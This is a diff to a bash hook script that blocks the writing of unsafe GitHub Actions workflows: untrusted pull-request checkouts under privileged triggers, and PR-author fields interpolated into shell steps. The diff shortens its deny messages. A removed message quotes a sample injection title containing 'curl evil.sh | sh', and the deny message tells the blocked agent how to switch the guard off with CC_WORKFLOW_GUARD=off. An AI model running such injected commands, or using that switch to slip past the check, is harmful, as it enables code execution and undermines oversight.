@@ -261,7 +261,7 @@ judge_workflow() {
   # 1. Untrusted checkout under a privileged trigger.
   if printf '%s' "$text" | grep -qE '^[[:space:]]*(pull_request_target|workflow_run):' \
      && printf '%s' "$text" | grep -qE '^[[:space:]]*ref:[[:space:]]*\$\{\{[[:space:]]*github\.(head_ref|event\.(pull_request\.head|workflow_run\.head))'; then
-    reason="This workflow triggers on pull_request_target/workflow_run — which runs with the BASE repository's secrets and a write token — and checks out the untrusted head ref. That executes fork-authored code inside a privileged context; it is GitHub's own documented critical anti-pattern, and it reads to a reviewer as 'checks out the PR, correct'. Build the PR in the pull_request context with no secrets, or check out the base ref and treat the PR tree as data."
+    reason="devops blocked this write: the workflow checks out the pull request's code under pull_request_target or workflow_run, which runs it with the repository's secrets and a write token. Build the PR under pull_request with no secrets, or check out the base ref and treat the PR tree as data."
   fi
 
   # 2. Attacker-controlled expression in a shell step. Matched by LEAF: base.sha
@@ -274,7 +274,7 @@ judge_workflow() {
         /^[[:space:]]*(uses|with|env|if|name):/ { inrun=0 }
         END { exit !found }
       '; then
-      reason="A \${{ github.event.* }} field a pull-request author can type — a title, body, branch name or commit message — is interpolated directly into a run: block. GitHub substitutes it into the shell BEFORE the shell runs, so a title of '\"; curl evil.sh | sh; #' is command execution, not a string. Pass it through an env: block and reference \"\$VAR\" inside the script, where the shell treats it as data."
+      reason="devops blocked this write: a run: step puts a \${{ github.event.* }} field a pull-request author controls (title, body, branch name, commit message) straight into the shell, where it runs as code. Pass it through env: and reference \"\$VAR\" in the script."
     fi
   fi
 }
@@ -334,9 +334,9 @@ EOF_C
   # is this marketplace's own layout and does not exist on an installer's disk; resolve
   # the real root the host hands the hook, and fall back to this script's own directory.
   auditroot="${CLAUDE_PLUGIN_ROOT:-$(cd "$(dirname "$0")/.." 2>/dev/null && pwd)}"
-  reason="$reason (file: $file)  Run bash ${auditroot}/scripts/workflow-audit.sh for the full report, including the warn-level findings this hook deliberately does not block."
+  reason="$reason (file: $file) Full report: bash ${auditroot}/scripts/workflow-audit.sh."
   # Name the escape in the message that blocks you.
-  reason="$reason CC_WORKFLOW_GUARD=off disables this guard for the session."
+  reason="$reason CC_WORKFLOW_GUARD=off turns this check off."
 
   jq -cn --arg r "$reason" \
     '{hookSpecificOutput:{hookEventName:"PreToolUse",permissionDecision:"deny",permissionDecisionReason:$r}}' 2>/dev/null
